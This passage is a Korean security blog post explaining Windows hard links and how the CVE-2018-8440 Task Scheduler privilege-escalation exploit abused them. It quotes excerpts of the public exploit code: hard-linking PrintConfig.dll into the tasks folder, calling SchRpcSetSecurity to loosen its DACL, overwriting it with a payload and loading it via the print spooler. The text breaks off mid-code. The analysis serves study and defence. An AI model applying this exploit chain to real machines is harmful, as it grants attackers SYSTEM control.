<!DOCTYPE html>
<html lang="en" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>

Hello HardLink? Bye HardLink! • Diffense

</title>
<meta name="description" content="하드링크란 무엇이며, 윈도우즈 권한상승 익스플로잇이 하드링크를 어떻게 활용하는지 살펴보겠습니다. 마지막으로 하드링크 공격에 대한 대응 방안에 대해 소개하겠습니다. ">
<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="/feed.xml">

<!-- icons -->
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/android-chrome-192x192.png" sizes="192x192">
<meta name="theme-color" content="#00f0ff">
<meta name="msapplication-TileColor" content="#00f0ff">
<meta name="msapplication-TileImage" content="/mstile-310x310.png">
<!-- /icons -->

<!-- og tags -->
<meta property="og:site_name" content="Diffense">
<meta property="og:title" content="Hello HardLink? Bye HardLink! • Diffense">
<meta property="og:locale" content="en">

  
    <meta property="og:image" content="http://localhost:4000/img/og-image.jpg">
  

<meta property="og:type" content="website">
<meta property="og:url" content="http://localhost:4000/2019/02/22/hard-link/">
<meta property="og:description" content="

하드링크란 무엇이며, 윈도우즈 권한상승 익스플로잇이 하드링크를 어떻게 활용하는지 살펴보겠습니다. 마지막으로 하드링크 공격에 대한 대응 방안에 대해 소개하겠습니다.
">
<!-- /og tags -->

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="/js/modernizr.js"></script>
<script src="/js/fitvids.js"></script>
<link href='//fonts.googleapis.com/css?family=Source+Code+Pro:400,700|Source+Sans+Pro:600,900|Crimson+Text:700italic,600,600italic,400,700,400italic' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="/css/reset.css">
<link rel="stylesheet" href="/css/pygments.css">

<link rel="stylesheet" href="/css/style.css">
<!--[if gte IE 9]>
  <style type="text/css">
    .gradient {
       filter: none;
    }
  </style>
<![endif]-->


<style>
header {
  margin-bottom: 40px;
}
@media all and (min-width: 500px) {
  header {
    margin-bottom: 100px;
  }
}
header::after {
  display: none;
}
</style>


</head>
<body>
	
	<div class="wrap">
		<header>
  <a href="/" class="website-title">
    
      Diffense
    

  </a>
  <nav>
  <a href="/about/">About</a>
  <a href="/contact/">Contact</a>
  <a href="/archive/">Archive</a>
</nav>

  
</header>

		


<article>
  <span class="meta">Feb 22, 2019 • 15&nbsp;min read</span>
	<h1>Hello HardLink? Bye HardLink!</h1>
		<p>하드링크란 무엇이며, 윈도우즈 권한상승 익스플로잇에서 하드링크를 어떻게 활용하는지 살펴보겠습니다. 마지막으로 하드링크 공격의 대응 방안에 대해 소개하겠습니다.</p>

<h3 id="하드-링크">하드 링크?</h3>

<p>윈도우즈 하드 링크는 동일한 파일을 참조하는 여러 개의 파일 이름을 만들 수 있는 기능입니다.</p>

<p>그림 하나면 쉽게 이해할 수 있습니다.</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Hard_Link_Illustration.svg/314px-Hard_Link_Illustration.svg.png" alt="hardlink" /> 출처: Wikipedia</p>

<p>실제 파일이 NTFS 파일시스템 볼륨(C드라이브)내 어딘가에 존재하고 있고, 우리는 이 파일을 A.TXT라는 이름으로 링크하여 참조하고 있는 것이죠.</p>

<p>하드링크를 이용하면 해당 파일을 참조하는 또 다른 이름(B.TXT)을 만들 수 있는 겁니다.</p>

<p>만약 2개의 링크(A.TXT, B.TXT)가 존재하고 있을 때, 발생할 수 있는 몇가지 경우를 살펴보며 하드링크를 좀 더 이해해보겠습니다.</p>

<ul>
  <li>파일 수정의 경우
    <ul>
      <li>A.TXT, B.TXT는 모두 같은 파일에 대한 링크라서 둘 중 어떤 경로를 통해 수정하더라도 같은 결과를 만듭니다.</li>
      <li>A.TXT를 수정한 다음 B.TXT 내용을 보면 수정된 내용과 동일한 것을 알 수 있습니다. 물론 역도 마찬가지입니다.</li>
    </ul>
  </li>
  <li>파일 삭제의 경우
    <ul>
      <li>파일은 <em>링크 참조 카운트</em>를 내부적으로 유지하고 있습니다. 예제의 경우 링크 참조 카운트는 2가 될 것입니다.</li>
      <li>하나의 링크(파일경로)를 삭제하면 그것이 가리키는 파일의 링크 참조카운트가 1씩 감소하고, 참조카운트가 0이 되면 최종적으로 파일이 삭제됩니다. 따라서 하나의 링크(A.TXT)를 삭제하더라도 다른 링크(B.TXT)를 통해 파일을 계속 참조할 수 있습니다.</li>
    </ul>
  </li>
  <li>파일의 권한을 변경하려는 경우
    <ul>
      <li>기존 링크(A.TXT)나 새로 생성된 하드링크(B.TXT) 둘 중 어떤 링크를 통해 권한을 바꾸어도 둘의 결과는 동일합니다. 링크가 가리키는 파일의 권한이 변경되는 것이죠.</li>
      <li>탐색기를 열어 A.TXT 파일의 권한을 수정한 후 B.TXT 권한을 확인해보세요. 동일함을 확인할 수 있을 겁니다. 역도 마찬가지입니다.</li>
      <li>링크 자체의 권한은 어떻게 바꾸는지 궁금한 분들이 있을 것입니다. 하드 링크는 디렉토리 엔트리로서 존재하는 것이라서 권한이라는 것이 없습니다. 즉 하드링크는 파일이 아니라서 파일 권한이라는 것이 존재하지 않습니다.</li>
    </ul>
  </li>
</ul>

<p>하드 링크 생성에는 다음과 같은 제약이 있습니다.</p>

<ul>
  <li>디렉토리간에는 하드링크를 만들 수 없습니다. (C:\A linked to C:\B)</li>
  <li>다른 볼륨간에 하드링크를 만들 수 없습니다. (C:\A.TXT linked to D:\B.TXT)</li>
</ul>

<p>이제 하드링크를 생성하는 방법을 알아보겠습니다.</p>

<h3 id="하드링크-생성-방법">하드링크 생성 방법</h3>

<p>커맨드라인에서 <strong>mklink</strong> 명령어를 이용하면 하드링크를 만들 수 있습니다.</p>

<p>다음은 기존파일(hello.txt)에 하드링크(bye.txt)를 생성하는 예제입니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /H bye.txt hello.txt
</code></pre></div></div>

<p>mklink 명령어는 <strong>CreateHardLink</strong> API를 사용하여 하드링크를 생성합니다.</p>

<h3 id="createhardlink">CreateHardLink</h3>

<p>윈도우즈에서 하드링크를 만들려면 <code class="highlighter-rouge">CreateHardLink</code> API(유저모드)를 사용합니다.</p>

<p><code class="highlighter-rouge">CreateHardLink</code><sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup> 사용법은 다음과 같습니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">CreateHardLinkA</span><span class="p">(</span>
  <span class="n">LPCSTR</span>                <span class="n">lpFileName</span><span class="p">,</span>
  <span class="n">LPCSTR</span>                <span class="n">lpExistingFileName</span><span class="p">,</span>
  <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpSecurityAttributes</span>
<span class="p">);</span>
</code></pre></div></div>

<p>첫번째 인자에 생성될 파일명(하드링크)을 넣어주고, 두번째 인자에 기존(타겟) 파일명을 입력해주면 하드링크를 생성할 수 있습니다.</p>

<p><code class="highlighter-rouge">CreateHardLink</code>가 실패를 리턴하는 경우는 다음과 같습니다.</p>
<ul>
  <li>1023개 이상 하드링크를 만들 경우</li>
  <li>MAX_PATH 길이보다 긴 패스이름이 사용될 경우</li>
  <li>다른 볼륨에 있는 파일에 하드링크를 거는 경우 (앞서 언급)</li>
  <li>디렉토리간에 하드링크를 거는 경우 (앞서 언급)</li>
  <li>또 있을까요?</li>
</ul>

<h3 id="하드링크의-재미난-사실">하드링크의 재미난 사실</h3>

<p>구글 P0의 James Forshaw는 윈도우즈 하드링크와 관련한 흥미로운 사실<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>을 발견합니다.</p>

<p>먼저 CreateHardLink의 구현 내부를 살펴보죠.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateHardLinkW</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpFileName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpExistingFileName</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 생략
</span>
    <span class="c1">// 타겟파일을 Open한다.(FILE_WRITE_ATTRIBUTES 권한을 요구)
</span>    <span class="n">status</span> <span class="o">=</span> <span class="n">NtOpenFile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ExistingFileHandle</span><span class="p">,</span> <span class="n">SYNCHRONIZE</span> <span class="o">|</span> <span class="n">FILE_WRITE_ATTRIBUTES</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ObjectAttributes</span><span class="p">,</span> <span class="p">...);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>   <span class="c1">// Open이 실패하면 하드링크 생성 실패를 리턴
</span> 
    <span class="c1">// 생략
</span>
    <span class="c1">// 하드링크 생성요청
</span>    <span class="n">status</span> <span class="o">=</span> <span class="n">NtSetInformationFile</span><span class="p">(</span><span class="n">ExistingFileHandle</span><span class="p">,</span> <span class="n">LinkInfo</span><span class="p">,</span> <span class="n">target</span><span class="p">.</span><span class="n">Length</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="n">FileLinkInformation</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">status</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>      
    
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 코드를 보면, 하드링크를 생성하기 위해 <code class="highlighter-rouge">NtOpenFile</code>과 <code class="highlighter-rouge">NtSetInformationFile</code>을 사용하고 있음을 알 수 있습니다. <code class="highlighter-rouge">NtOpenFile</code>로 타겟파일을 오픈하고나서, <code class="highlighter-rouge">NtSetInformationFile</code>을 호출하여 윈도우즈OS에 하드링크 생성을 요청하는 2단계로 이루어져 있는 것이죠.</p>

<p>여기서 눈여겨 볼 점은 타겟파일을 Open하는 데 <code class="highlighter-rouge">FILE_WRITE_ATTRIBUTES</code>을 인자로 사용한 것인데요. 만약 사용자가 타겟파일에 대해 <code class="highlighter-rouge">FILE_WRITE_ATTRIBUTES</code> 열기 권한이 없으면, <code class="highlighter-rouge">NtOpenFile</code> 호출은 실패하게 되고 결국 <code class="highlighter-rouge">CreateHardLink</code> 호출은 실패하게 됩니다.</p>

<p>아래 예는 kernel32.dll에 하드링크를 만들기 위해 mklink를 사용하려는데, 방금 언급한 NtOpenFile의 호출이 실패하여 결국 하드링크 생성에 실패하는 것을 보여주고 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Test&gt;mklink /H hardlink.txt c:\windows\system32\kernel32.dll
Access is denied.
</code></pre></div></div>

<p>James Forshaw는 이 지점에서 FILE_WRITE_ATTRIBUTES 없이 타겟파일을 Open(<code class="highlighter-rouge">NtOpenFile</code>)하면 어떻게 될까? 라는 의문을 가지고 실험을 해보기 시작합니다. 실험 결과, 다음과 같은 사실을 발견하게 됩니다.</p>

<blockquote>
  <p>대상 파일에 대한 Write 권한이 없어도 하드링크를 만들 수 있다</p>
</blockquote>

<p><code class="highlighter-rouge">CreateHardLink</code>를 이용하면 파일열기에 실패하여 하드링크를 만들 수 없는 경우(kernel32.dll처럼)가 있었는데, James Forshaw가 발견한 사실을 이용하면 그 경우에도 하드링크를 만들 수 있게 된 것이죠. 이를 증명하기 위해 다음과 같은 POC를 작성하여 공개<sup id="fnref:3"><a href="#fn:3" class="footnote">3</a></sup>하였습니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 주요부분만 추려냈습니다.
</span><span class="n">bool</span> <span class="nf">CreateNativeHardlink</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">linkname</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">targetname</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// ...
</span>
    <span class="c1">// 타겟파일을 오픈합니다.(DesiredAccess=MAXIMUM_ALLOWED)
</span>    <span class="n">NtOpenFile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ExistingFileHandle</span><span class="p">,</span> <span class="n">MAXIMUM_ALLOWED</span><span class="cm">/*이것이 바뀌었습니다*/</span><span class="p">,,,,);</span>

    <span class="c1">// ...
</span>
    <span class="c1">// 하드링크 생성을 요청합니다.
</span>    <span class="n">NtSetInformationFile</span><span class="p">(</span><span class="n">ExistingFileHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">io_status</span><span class="p">,</span> <span class="n">link_info</span><span class="p">,</span> <span class="n">link_info</span><span class="p">.</span><span class="n">size</span><span class="p">(),</span> <span class="n">FileLinkInformation</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">CreateHardLink</code>는 타겟파일을 오픈할 때 요청한 권한이 <code class="highlighter-rouge">FILE_WRITE_ATTRIBUTES</code>인 반면, James Forshaw가 작성한 함수 <code class="highlighter-rouge">CreateNativeHardlink</code>는 <code class="highlighter-rouge">MAXIMUM_ALLOWED</code>를 사용한다 것이 가장 큰 차이점입니다.</p>

<p><code class="highlighter-rouge">MAXIMUM_ALLOWED</code>는 어떻게든 파일을 열어달라는 의미로 보면 됩니다. 즉 <em>어떻게든 대상파일을 열기만 하면 하드링크 생성이 가능하다</em>는 점을 코드를 통해 얘기해주고 있습니다.</p>

<p>James Forshaw가 작성한 CreateHardLink.exe 툴을 이용하여 지금까지 설명한 내용을 테스트해 볼 수 있습니다.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CreateHardLink.exe hardlink.exe c:\windows\system32\kernel32.dll
dir hardlink.exe
</code></pre></div></div>

<p>mklink를 이용하면 생성할 수 없었던 하드링크를, James Forshaw가 만든 툴을 이용하면 하드링크를 만들 수 있음을 확인할 수 있습니다.</p>

<h3 id="하드링크-오용hardlink-abusing">하드링크 오용(Hardlink Abusing)</h3>

<p>James Forshaw가 발견한 하드링크 문제는 단순 흥미거리로 그치지 않고, 최근까지도 권한상승 익스플로잇에 활용되고 있습니다.</p>

<p>하드링크가 어떤 문제가 될 수 있을까요?</p>

<p>WRITE 권한이 없는 대상파일(예: c:\windows\notepad.exe)에 하드링크를 걸었다고 생각해봅시다. 하드링크를 통해서 대상파일(notepad.exe)을 WRITE할 수 있을까요? 만약 그렇게 된다면 바로 권한상승 취약점으로 이어질 수 있지만, 앞서 언급했듯이 하드링크는 디렉토리엔트리로서 그 자체로 퍼미션을 가지고 있지 않고 하드링크가 가리키는 파일이 퍼미션을 가지고 있기 때문에 하드링크를 통해서 WRITE 시도를 하게 되면, 그것이 가리키는 파일에 대한 접근검사가 이루어져서 WRITE 시도가 실패하게 되죠. Write권한이 없는 타겟파일에 하드링크를 걸 수는 있으나, 하드링크를 통한 타겟파일의 Write는 허용되지 않는 것입니다.</p>

<p>다른 케이스를 생각해 보겠습니다. c:\test 폴더가 있습니다. 이 폴더에는 일반사용자와 시스템관리자 모두 파일 생성/쓰기/삭제 권한이 주어져 있는 상태입니다. 시스템서비스는 일반사용자도 c:\test\log.txt을 쓸 수 있도록 해당 파일의 퍼미션을 바꾸는 작업을 수행한다고 생각해보죠.</p>

<p>만약 시스템서비스가 c:\test\log.txt 파일의 퍼미션을 바꾸려 하기 전에, 일반사용자(해커)가 c:\test\log.txt를 삭제하고 하드링크(c:\test\log.txt -&gt; c:\windows\system32\kernel32.dll)를 생성하면 어떻게 될까요? 시스템서비스는 하드링크를 열어 퍼미션을 바꿀 것이고, 결국 하드링크가 가리키던 kernel32.dll의 퍼미션이 일반사용자도 파일쓰기 권한을 가지도록 바뀌게 될 것입니다. 파일쓰기 권한이 없던 일반사용자가 시스템의 중요 파일을 Write할 수 있게 되어 버린 것이죠.</p>

<p>시나리오가 작위적이라 느껴질 수 있습니다. 그래서 실제 취약점 사례를 바로 살펴보겠습니다.</p>

<h3 id="cve-20188440">CVE-2018–8440</h3>

<p>실제 권한 상승 익스플로잇에서는 하드링크를 어떻게 활용하는지 알아보겠습니다.</p>

<p>살펴볼 취약점은 2018년 말에 발표된 <strong>태스크 스케쥴러 서비스</strong>의 권한상승(EoP) 취약점입니다. 이 취약점은 많은 주목을 받았는데요. 그 이유는 제작자인 <strong>sandboxescaper</strong>가 제로데이를 그대로 공개해 버렸기 때문입니다.</p>

<p><img src="https://www.welivesecurity.com/wp-content/uploads/2018/09/Sandbox-Tweet-Edited.jpg" alt="sandboxescaper" /> Source: welivesecurity.com</p>

<p>또한 APT 그룹에서 자신들의 오퍼레이션에 즉시 활용할 수 있을 정도의 제로데이였기 때문에(실제로 APT그룹에서 활용하였다는 사실<sup id="fnref:4"><a href="#fn:4" class="footnote">4</a></sup>이 밝혀졌습니다), 많은 시스템들이 위험에 노출되어 버린 상황이 되어 더 이슈가 되었죠.</p>

<p>취약점이 존재했던 태스크 스케쥴러 서비스는 윈도우즈에서 가장 높은 권한인 시스템(SYSTEM)권한으로 실행됩니다. 이 서비스는 ALPC 포트라는 일종의 IPC를 통해 외부 프로세스와 통신할 수 있도록 인터페이스를 열어두었습니다.</p>

<p>열어둔 API 중에서 <strong>SchRpcSetSecurity</strong>에서 취약점이 발생했습니다. 이 API의 역할은 <em>c:\windows\tasks</em> 폴더에 있는 파일의 DACL을 제어할 수 있는 것인데요. 예를 들어 <em>“일반사용자가 c:\windows\tasks\hello.txt 파일을 READ/WRITE하도록 DACL을 변경해주세요”</em>와 같은 메시지를 서비스에 요청할 수 있습니다.</p>

<p>tasks 폴더에 위치한 파일의 DACL을 변경할 수 있는 문제와 더불어 “일반 사용자도 tasks 폴더에 파일을 생성(쓰기)할 수 있다”는 사실이 합쳐져 권한상승 익스플로잇이 탄생할 수 있었습니다. 이 과정에서 하드링크가 활용되는데요.</p>

<p>익스플로잇 과정을 살펴보면서 하드링크의 활용을 이해해보겠습니다.</p>

<ol>
  <li>
    <p>tasks 폴더에 <strong>하드링크</strong>(c:\windows\tasks\UpdateTask.job -&gt; c:\windows\system32\kernel32.dll)을 하나 생성합니다. <em>일반사용자가 tasks 폴더에 파일을 생성할 수 있고, 대상 파일(kernel32.dll)에 하드링크도 걸 수 있으니 1번 작업이 가능해집니다.</em></p>
  </li>
  <li>
    <p>SchRpcSetSecurity를 호출하여, “일반사용자가 c:\windows\tasks\UpdateTask.job의 파일쓰기권한을 가지도록” DACL 변경을 요청합니다.</p>
  </li>
  <li>
    <p>태스크스케쥴러서비스는 DACL 변경대상이 하드링크인지 아닌지 여부와 상관없이 DACL을 변경해줍니다. 결국 하드링크 대상인 kernel32.dll의 DACL을 변경해버리는 결과가 발생합니다. 즉 일반사용자가 kernel32.dll에 대한 쓰기 권한을 갖게 되는 결과를 낳게 됩니다.</p>
  </li>
</ol>

<p>위 예에서는 kernel32.dll을 예로 들었지만, 앞서 설명드렸듯이 Open할 수 있는 파일이면 모두 하드링크 대상으로 삼을 수 있습니다.</p>

<p>sandboxescaper는 PrintConfig.dll을 하드링크 타겟으로 삼았습니다. 해당 Dll은 스풀러(Spooler)서비스가 사용하는 모듈입니다. sandboxescaper는 취약점을 이용해 PrintConfig.dll를 쓰기 가능하도록 만든 후 그것을 자신의 페이로드로 교체합니다. 그런다음 스풀러(Spooler) 서비스를 호출하여 PrintConfig.dll(페이로드)을 물고 올라가도록 합니다. 최종적으로 자신의 페이로드가 스풀러 프로세스 컨텍스트(시스템권한)에서 실행되도록 하는 것이죠.</p>

<p>그가 공개한 익스플로잇 코드<sup id="fnref:5"><a href="#fn:5" class="footnote">5</a></sup>를 살펴보겠습니다.</p>

<p>(1) 하드링크 타겟(PrintConfig.dll)의 정확한 경로를 구합니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">hFind</span><span class="p">;</span>
<span class="n">hFind</span> <span class="o">=</span> <span class="n">FindFirstFile</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">DriverStore</span><span class="se">\\</span><span class="s">FileRepository</span><span class="se">\\</span><span class="s">prnms003.inf_amd64*"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FindFileData</span><span class="p">);</span>
<span class="kt">wchar_t</span> <span class="n">BeginPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="s">L"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">DriverStore</span><span class="se">\\</span><span class="s">FileRepository</span><span class="se">\\</span><span class="s">"</span><span class="p">;</span>
<span class="kt">wchar_t</span> <span class="n">PrinterDriverFolder</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
<span class="kt">wchar_t</span> <span class="n">EndPath</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Amd64</span><span class="se">\\</span><span class="s">PrintConfig.dll"</span><span class="p">;</span>
<span class="n">wmemcpy</span><span class="p">(</span><span class="n">PrinterDriverFolder</span><span class="p">,</span> <span class="n">FindFileData</span><span class="p">.</span><span class="n">cFileName</span><span class="p">,</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">FindFileData</span><span class="p">.</span><span class="n">cFileName</span><span class="p">));</span>
<span class="n">FindClose</span><span class="p">(</span><span class="n">hFind</span><span class="p">);</span>
<span class="n">wcscat</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span> <span class="n">PrinterDriverFolder</span><span class="p">);</span>
<span class="n">wcscat</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span> <span class="n">EndPath</span><span class="p">);</span>
</code></pre></div></div>
<p>(2) PrintConfig.dll의 위치를 알았으니, tasks 폴더 밑에 하드링크(UpdateTask.job -&gt; PrintConfig.dll)을 만듭니다. 여기서 James Forshaw가 만든 CreateNativeHardlink를 그대로 재사용하고 있음을 알 수 있습니다. CreateHardLink(표준API)를 사용하면 PrintConfig.dll에 하드링크를 걸 수 없기 때문이죠!</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
</span><span class="n">CreateNativeHardlink</span><span class="p">(</span><span class="s">L"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">tasks</span><span class="se">\\</span><span class="s">UpdateTask.job"</span><span class="p">,</span> <span class="n">BeginPath</span><span class="p">);</span>
</code></pre></div></div>
<p>(3) 태스크 스케쥴러 서비스의 SchRpcSetSecurity를 호출하여 UpdateTask.job의 DACL을 변경합니다. 요청이 성공하면 PrintConfig.dll이 일반사용자도 쓰기가능한 상태로 바뀔 것입니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">RunExploit</span><span class="p">()</span> <span class="p">{</span>
<span class="n">RPC_BINDING_HANDLE</span> <span class="n">handle</span><span class="p">;</span>
<span class="n">RPC_STATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">CreateBindingHandle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">handle</span><span class="p">);</span>

<span class="c1">//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
</span><span class="n">_SchRpcCreateFolder</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">L"UpdateTask"</span><span class="p">,</span> <span class="s">L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">_SchRpcSetSecurity</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">L"UpdateTask"</span><span class="p">,</span> <span class="s">L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>(4) 페이로드코드(DLL)는 익스플로잇 바이너리(PE) 안에 리소스로 포함되어 있습니다. 페이로드 데이터를 추출하여 PrintConfig.dll에 덮어씁니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HMODULE</span> <span class="n">mod</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">L"ALPC-TaskSched-LPE"</span><span class="p">);</span>
	
<span class="c1">// 페이로드DLL은 리소스에 포함되어 있습니다. 이 코드블록에서 페이로드 DLL을 찾습니다.
</span><span class="n">HRSRC</span> <span class="n">myResource</span> <span class="o">=</span> <span class="o">::</span><span class="n">FindResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">MAKEINTRESOURCE</span><span class="p">(</span><span class="n">IDR_RCDATA1</span><span class="p">),</span> <span class="n">RT_RCDATA</span><span class="p">);</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">myResourceSize</span> <span class="o">=</span> <span class="o">::</span><span class="n">SizeofResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">myResource</span><span class="p">);</span>
<span class="n">HGLOBAL</span> <span class="n">myResourceData</span> <span class="o">=</span> <span class="o">::</span><span class="n">LoadResource</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">myResource</span><span class="p">);</span>
<span class="kt">void</span><span class="o">*</span> <span class="n">pMyBinaryData</span> <span class="o">=</span> <span class="o">::</span><span class="n">LockResource</span><span class="p">(</span><span class="n">myResourceData</span><span class="p">);</span>
	
<span class="c1">//We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
</span><span class="n">HANDLE</span> <span class="n">hFile</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">dwBytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">do</span> <span class="p">{</span>
	<span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">BeginPath</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>                  
	<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pMyBinaryData</span><span class="p">,</span><span class="n">myResourceSize</span><span class="p">,</span><span class="o">&amp;</span><span class="n">dwBytesWritten</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>           
	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">);</span>
<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
</code></pre></div></div>
<p>(5) 스풀러 서비스가 PrintConfig.dll(페이로드)를 로드하도록 만듭니다. 로드에 성공하면, 스풀러 서비스 컨텍스트(시스템권한)에서 페이로드가 실행될 것입니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
</span><span class="n">CoInitialize</span><span class="p">(</span><span class="n">nullptr</span><span class="p">);</span>
<span class="n">IXpsOMObjectFactory</span> <span class="o">*</span><span class="n">xpsFactory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">__uuidof</span><span class="p">(</span><span class="n">XpsOMObjectFactory</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">__uuidof</span><span class="p">(</span><span class="n">IXpsOMObjectFactory</span><span class="p">),</span> <span class="n">reinterpret_cast</span><span class="o">&lt;</span><span class="n">LPVOID</span><span class="o">*&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">xpsFactory</span><span class="p">));</span>
<span class="n">HANDLE</span> <span class="n">completionEvent</span> <span class="o">=</span> <span class="n">CreateEvent</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="n">IXpsPrintJob</span> <span class="o">*</span><span class="n">job</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
